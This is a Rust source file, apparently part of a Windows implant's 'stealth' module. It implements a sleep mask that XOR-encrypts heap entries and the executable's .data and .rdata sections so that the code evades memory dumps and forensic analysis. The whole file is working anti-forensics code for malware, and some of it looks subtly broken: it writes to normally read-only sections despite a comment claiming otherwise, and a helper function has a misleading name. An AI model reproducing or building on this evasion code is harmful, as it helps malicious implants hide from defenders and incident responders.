// Client/core/src/stealth/mask.rs
// Memory & Heap Obfuscation (Masking)
//
// Phase 2: Implements Sleep Mask — XOR-encrypts sensitive memory regions
// during sleep intervals to protect against memory dumps and forensic analysis.

use winapi::um::minwinbase::{PROCESS_HEAP_ENTRY, PROCESS_HEAP_ENTRY_BUSY};
use winapi::um::winnt::HANDLE;

/// XOR-Masks entries in a private heap.
pub unsafe fn mask_heap(h_heap: HANDLE, mask: u8) {
    use winapi::um::heapapi::HeapWalk;
    let mut entry: PROCESS_HEAP_ENTRY = std::mem::zeroed();
    while HeapWalk(h_heap, &mut entry) != 0 {
        if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0 {
            let data = std::slice::from_raw_parts_mut(entry.lpData as *mut u8, entry.cbData as usize);
            for b in data { *b ^= mask; }
        }
    }
}

/// Full-process-heap XOR is **unsafe** with concurrent threads (tokio/runtime).
/// Kept as a no-op stub so old call sites compile; do not re-enable without freezing all threads.
pub unsafe fn mask_default_heap(_xor_key: &[u8]) {
    // Intentionally disabled: HeapWalk + XOR of live heap causes random crashes.
}

/// 🛡️ Phase 2: Find and XOR-encrypt the .data and .rdata sections
/// of the current executable in memory
pub unsafe fn mask_pe_sections(xor_key: &[u8]) {
    // Get ImageBaseAddress via inline asm (x64)
    let image_base: *const u8;
    #[cfg(target_arch = "x86_64")]
    {
        std::arch::asm!(
            "mov rax, gs:[0x60]",
            "mov rax, [rax + 0x10]",  // PEB->ImageBaseAddress
            out("rax") image_base,
        );
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        image_base = std::ptr::null();
    }

    if image_base.is_null() { return; }

    // Parse PE headers to find .data and .rdata sections
    shift_jis_const_xor(image_base, xor_key);
}

/// XOR-encrypt/decrypt PE section by iterating over section headers
unsafe fn shift_jis_const_xor(image_base: *const u8, xor_key: &[u8]) {
    // Read DOS header
    let dos_header = image_base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != 0x5A4D { return; }

    // Read NT headers (x64)
    let nt_headers = image_base
        .offset((*dos_header).e_lfanew as isize)
        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;

    // Read section headers
    let section_header = nt_headers
        .cast::<u8>()
        .offset(24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as isize)
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;

    let section_count = (*nt_headers).FileHeader.NumberOfSections;

    // Target section names: .data, .rdata, .text (if not executing)
    let target_names: &[&[u8]] = &[b".data\0", b".rdata\0"];

    for i in 0..section_count {
        let section = section_header.add(i as usize);
        let _name = &(*section).Name;

        // Check if this section name matches any target
        let should_mask = target_names.iter().any(|&target| {
            let mut matches = true;
            for j in 0..5 {
                if j >= target.len() || target[j] == 0 { break; }
                if target[j] != (*section).Name[j] { matches = false; break; }
            }
            matches
        });

        if !should_mask { continue; }

        let section_addr = image_base.offset((*section).VirtualAddress as isize) as *mut u8;
        let section_size = *(*section).Misc.VirtualSize() as usize;

        if section_size == 0 { continue; }

        // Check current protection — skip if not writable
        let section_data = std::slice::from_raw_parts_mut(section_addr, section_size);

        // XOR encrypt each byte with the key
        for (j, b) in section_data.iter_mut().enumerate() {
            *b ^= xor_key[j % xor_key.len()];
        }

        let _ = (section_addr, section_size);
    }
}
